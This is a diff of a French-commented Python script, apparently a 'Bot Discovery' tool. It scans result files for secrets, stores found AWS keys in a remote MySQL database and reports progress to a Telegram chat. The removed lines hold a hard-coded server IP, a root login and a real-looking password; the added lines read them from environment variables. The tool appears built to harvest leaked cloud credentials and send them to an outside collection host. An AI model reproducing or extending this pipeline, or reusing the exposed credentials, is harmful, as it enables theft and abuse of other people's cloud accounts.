@@ -17,6 +17,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import mysql.connector
 from mysql.connector import Error
 
+load_dotenv()
+
 # Configuration des répertoires
 gopath_bin_path = "/home/ubuntu/go/bin"
 os.environ['PATH'] += os.pathsep + "/usr/local/go/bin" + os.pathsep + gopath_bin_path
@@ -68,11 +70,12 @@ chat_id = "6459873636"
 def insert_into_table(table_name, columns, values, unique_check_column, unique_value):
     """Insère une ligne dans une table spécifique en évitant les doublons."""
     try:
-        connection = mysql.connector.connect(
-            host="94.156.67.171",
-            user="root",
-            password="Stupid!Rac00n666",
-            database="rez"
+        # Connexion à la base de données en utilisant les variables d'environnement
+        connection = connect(
+            host=DB_HOST,
+            user=DB_USER,
+            password=DB_PASSWORD,
+            database=DB_DATABASE
         )
         cursor = connection.cursor()
 
@@ -94,8 +97,9 @@ def insert_into_table(table_name, columns, values, unique_check_column, unique_v
 
         cursor.close()
         connection.close()
-    except mysql.connector.Error as e:
+    except Error as e:
         print(f"Erreur d'insertion dans {table_name} : {e}")
+
 
 def insert_key_to_aws_no_secret_table(api_key, url):
     """Insère une clé AWS sans secret dans la table aws_keys_no_secret."""
@@ -322,9 +326,9 @@ def process_file(file_name):
             with open("final_results.txt", "r") as results_file:
                 final_results = results_file.read()
             process_results_with_regex_and_secrets(final_results, file_name)
-            send_telegram_message(f"----------------------------------------------\n\n✅ Processing successful for file {file_name}.\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}\n\n----------------------------------------------")
+            send_telegram_message(f"⬆️ Processing successful for file {file_name}.\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
         else:
-            send_telegram_message(f"----------------------------------------------\n\n❌ Processing failed for file {file_name}, return code: {return_code}\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}\n\n----------------------------------------------")
+            send_telegram_message(f"❌ Processing failed for file {file_name}, return code: {return_code}\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
         Path(directories["backup_dir"]).mkdir(parents=True, exist_ok=True)
         backup_file_path = f"{directories['backup_dir']}/{file_name}"
         shutil.move(dest_file_path, backup_file_path)
@@ -353,7 +357,7 @@ class FileEventHandler(FileSystemEventHandler):
                 log_message(f"Le fichier {file_path} n'a pas fini d'être copié.")
 
 if __name__ == "__main__":
-    send_telegram_message(f"----------------------------------------------\n\n✅ Bot Discovery démarré avec succès. ✅\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}\n\n----------------------------------------------")
+    send_telegram_message(f"⬆️ Bot Discovery démarré avec succès. ⬆️\n\n🖥️ *Serveur Hôte* : {server_hostname}\n\n📡 *Adresse IP du Serveur* : {server_ip}")
 
     # Traitez les fichiers existants dans le répertoire de surveillance
     for existing_file in Path(directories["watched_dir"]).iterdir():
